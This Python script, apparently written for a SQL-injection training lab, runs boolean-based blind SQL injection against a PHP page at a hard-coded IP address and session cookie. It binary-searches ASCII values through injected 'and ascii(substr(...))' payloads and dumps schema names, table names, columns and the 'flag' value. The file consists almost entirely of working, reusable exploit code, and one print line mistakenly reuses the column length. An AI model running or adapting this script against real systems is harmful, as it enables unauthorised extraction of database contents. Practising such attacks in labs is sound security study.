#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib
import requests

tableData = []
# url、cookie根据实际情况填写
url = "http://113.108.70.111:63243/sqli4.php?id=1"
success_str = "Hello <b>admin </b>"
# 拼接实验环境的cookie
cookie = "PHPSESSID=t68kgkeidobo0psb01p2he9t64"
headers = {
    "cookie": cookie
}
lengthpayload = " and (%s)>=%d #"
asciipayload = " and ascii(substr((%s),%d,1))>=%d #"


def getLengthResult(payload, in_str, len):
    final_url = url + payload % (in_str, len)
    res = requests.get(final_url, headers=headers)
    res_str = res.text
    if success_str in res_str:
        return True
    else:
        return False


def getAsciiResult(payload, in_str, pos, ascii):
    final_url = url + payload % (in_str, pos, ascii)
    res = requests.get(final_url, headers=headers)
    res_str = res.text
    if success_str in res_str:
        return True
    else:
        return False


def getLength(payload, str):
    leftLen = 0
    rightLen = 0
    guess = 10
    step = 5
    flag = False
    while 1:
        if getLengthResult(payload, str, guess) == True:
            guess = guess + step
            flag = True
        else:
            if flag == True:
                rightLen = guess
                leftLen = guess - step
            else:
                rightLen = guess
            break
    if rightLen - leftLen > 10:
        while leftLen < rightLen - 1:
            midLen = (leftLen + rightLen) >> 1
            if (getLengthResult(payload, str, midLen) == True):
                leftLen = midLen
            else:
                rightLen = midLen
        return leftLen
    else:
        for i in range(leftLen, rightLen + 1):
            if (getLengthResult(payload, str, i) == False):
                return i - 1


def getAscii(payload, str, len):
    res = ''
    for i in range(1, len + 1):
        leftAsc = 32
        rightAsc = 127
        while leftAsc < rightAsc - 1:
            midAsc = (leftAsc + rightAsc) >> 1
            if (getAsciiResult(payload, str, i, midAsc) == True):
                leftAsc = midAsc
            else:
                rightAsc = midAsc
        res += chr(leftAsc)
    return res


# get database length
get_db_length = "select length(group_concat(schema_name)) from information_schema.schemata"
dbLen = getLength(lengthpayload, get_db_length)
print("database length is " + str(dbLen))
# get database name
get_db_name = "select group_concat(schema_name) from information_schema.schemata"
dbNames = getAscii(asciipayload, get_db_name, dbLen)
dblist = dbNames.split(",")
print("dblist name is %s" % (dblist))
# get table name
tableLen = getLength(lengthpayload,
                     "select length(group_concat(table_name)) from information_schema.tables where table_schema='lession4'")
print("tableLen length is " + str(tableLen))
tableNames = getAscii(asciipayload,
                      "select group_concat(table_name) from information_schema.tables where table_schema='lession4'",
                      tableLen)
tablelist = tableNames.split(",")
print("table name is %s" % (tablelist))
# get col name
colLen = getLength(lengthpayload,
                   "select length(group_concat(column_name)) from information_schema.columns  where table_schema='lession4'  and table_name='flag'")
print("tableLen length is " + str(colLen))
colNames = getAscii(asciipayload,
                    "select group_concat(column_name) from information_schema.columns  where table_schema='lession4' and table_name='flag'",
                    colLen)
print("col name is %s" % (colNames))
# get value name
valLen = getLength(lengthpayload, "select length(group_concat(flag)) from lession4.flag")
print("tableLen length is " + str(colLen))
valname = getAscii(asciipayload, "select group_concat(flag) from lession4.flag", valLen)
print("value name is %s" % (valname))
